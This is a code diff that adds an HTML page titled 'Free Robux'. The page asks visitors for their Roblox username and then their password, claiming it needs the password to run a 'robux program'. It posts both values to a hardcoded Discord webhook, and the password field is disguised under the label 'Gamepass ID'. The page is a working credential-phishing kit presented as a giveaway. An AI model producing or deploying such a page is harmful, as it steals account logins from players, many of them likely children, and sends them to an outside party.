@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Robux</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+        }
+        .button {
+            background-color: blue;
+            color: white;
+            padding: 15px 32px;
+            text-align: center;
+            font-size: 16px;
+            cursor: pointer;
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button class="button" onclick="start()">Start</button>
+        <div id="step1" style="display:none;">
+            <h2>Enter your Roblox Username</h2>
+            <input type="text" id="username" />
+            <button onclick="nextStep()">Next</button>
+        </div>
+        <div id="step2" style="display:none;">
+            <h2>Enter your Password inorder for us to run the robux program on your account</h2>
+            <input type="text" id="gamepassId" />
+            <button onclick="submit()">Submit</button>
+        </div>
+    </div>
+
+    <script>
+        function start() {
+            document.querySelector('.button').style.display = 'none';
+            document.getElementById('step1').style.display = 'block';
+        }
+
+        function nextStep() {
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+
+        async function submit() {
+            const username = document.getElementById('username').value;
+            const gamepassId = document.getElementById('gamepassId').value;
+
+            const webhookUrl = "https://discord.com/api/webhooks/1312012834502217729/3mr-ZSEl_hOxM-0tqTfpUlZVXO7i9MZDA7JVW0eXqY-H2TjLli8dBQ8qbaokVfq77Utb";
+            
+            const payload = {
+                content: `Username: ${username}, Gamepass ID: ${gamepassId}`
+            };
+
+            const response = await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                alert('Information submitted successfully!');
+            } else {
+                alert('Failed to submit information.');
+            }
+        }
+    </script>
+</body>
+  </html>
